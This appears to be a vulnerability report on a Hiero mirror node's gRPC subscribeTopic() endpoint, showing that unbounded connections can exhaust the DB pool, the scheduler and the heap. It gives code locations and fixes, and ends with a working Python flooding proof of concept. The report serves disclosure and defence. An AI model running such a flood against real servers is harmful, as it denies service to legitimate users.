### Title
Unbounded `subscribeTopic()` Connections Enable Resource-Exhaustion DoS on the gRPC Mirror Node

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no per-IP, per-client, or global subscriber cap. The only server-side guard — `maxConcurrentCallsPerConnection = 5` — limits calls *per connection*, not total connections. An unauthenticated attacker can open an unbounded number of TCP connections, each carrying 5 concurrent subscriptions, exhausting the database connection pool, the `boundedElastic` scheduler queue, and heap memory, rendering the mirror node unable to serve legitimate clients.

### Finding Description

**Code locations:**

- `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, `subscribeTopic()`, lines 59–92
- `grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–34
- `grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14

**Root cause — three compounding gaps:**

1. **No per-IP or per-client rate limit.** `subscribeTopic()` accepts every call unconditionally. The `subscriberCount` field (line 48) is a Micrometer `Gauge` metric only; it is never read back to reject or throttle new subscriptions (lines 52–55, 89–91). The rate-limiting infrastructure (Bucket4j) present in the `web3` module does not exist in the `grpc` module at all.

2. **`maxConcurrentCallsPerConnection` is per-connection, not global.** `GrpcConfiguration` calls `serverBuilder.maxConcurrentCallsPerConnection(5)` (line 33). This caps calls on a *single* TCP connection to 5, but places no ceiling on the number of TCP connections. An attacker opens N connections × 5 calls = 5N concurrent subscriptions.

3. **Each subscription allocates persistent resources.** For every call to `subscribeTopic()`:
   - A `TopicContext` object is allocated (lines 61, 181–197).
   - `topicMessageRetriever.retrieve(filter, true)` is invoked immediately (line 63), consuming a JDBC connection from the pool for the duration of the historical query.
   - A `safetyCheck` task is scheduled on `Schedulers.boundedElastic()` (lines 67–70), consuming a slot in that scheduler's bounded task queue (default cap: 10 × CPU cores threads, 100 000 queued tasks).
   - A live listener subscription is registered with the shared Redis/polling listener (line 120).

**Why the existing check is insufficient:**

`maxConcurrentCallsPerConnection = 5` is the *only* server-side guard. It does not bound total connections, total subscriptions, or resource consumption per client IP.

### Impact Explanation

An attacker flooding the server with subscriptions causes:

1. **JDBC connection pool exhaustion** — historical retrieval holds a DB connection per subscription; once the pool is full, all other queries (including those serving legitimate clients) block or fail.
2. **`boundedElastic` scheduler saturation** — the safety-check `Mono.delay` task is submitted per subscription; saturating the queue causes `RejectedExecutionException` across all reactive pipelines sharing that scheduler.
3. **Heap pressure / OOM** — thousands of live `TopicContext` + reactive pipeline objects accumulate until GC pressure degrades throughput or triggers an OOM kill.

The mirror node's primary function — delivering transaction data to clients — is disrupted or halted. Severity: **High** (availability impact, no authentication required).

### Likelihood Explanation

- **No authentication required.** The gRPC port (5600) is publicly exposed; any client can call `subscribeTopic`.
- **Trivially scriptable.** A single machine can open thousands of HTTP/2 connections using standard gRPC client libraries (e.g., `grpc-java`, `grpcurl`, Python `grpcio`).
- **Persistent.** Subscriptions without an `endTime` never self-terminate (line 124: `return Flux.never()`), so connections held open by the attacker remain active indefinitely.
- **Low cost.** Each connection is cheap for the attacker (HTTP/2 multiplexing) but expensive for the server (DB connection, scheduler slot, heap).
- The optional GCP gateway `maxRatePerEndpoint: 250` in `charts/hedera-mirror-grpc/values.yaml` is a deployment-level hint, not enforced in the application, and is disabled by default (`gateway.gcp.enabled: true` only in that chart, not universally).

### Recommendation

1. **Add a global subscriber cap** — read `subscriberCount` before accepting a new subscription and return `RESOURCE_EXHAUSTED` if it exceeds a configurable threshold.
2. **Add per-IP connection rate limiting** — implement a `ServerInterceptor` (analogous to the existing `GrpcInterceptor`) that tracks open subscriptions per remote IP and rejects excess calls.
3. **Add a `maxConnections` limit** — configure `NettyServerBuilder.maxConnectionAge(...)` and a total connection ceiling to bound the attack surface at the transport layer.
4. **Require `endTime` or enforce a maximum subscription duration** — prevent indefinitely-open subscriptions from accumulating.
5. **Isolate the DB connection pool** — use a separate, size-limited pool for `subscribeTopic` historical retrieval so that subscription floods cannot starve other queries.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc-host:5600"
NUM_CONNECTIONS = 500   # each carries 5 concurrent streams = 2500 subscriptions

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # no endTime → subscription never terminates
    )
    # open 5 concurrent streaming calls on this connection
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        try:
            next(iter(s))   # keep stream alive
        except Exception:
            pass

threads = [threading.Thread(target=flood) for _ in range(NUM_CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Result: DB connection pool exhausted, boundedElastic scheduler saturated,
# legitimate subscribers receive UNAVAILABLE or timeout errors.
```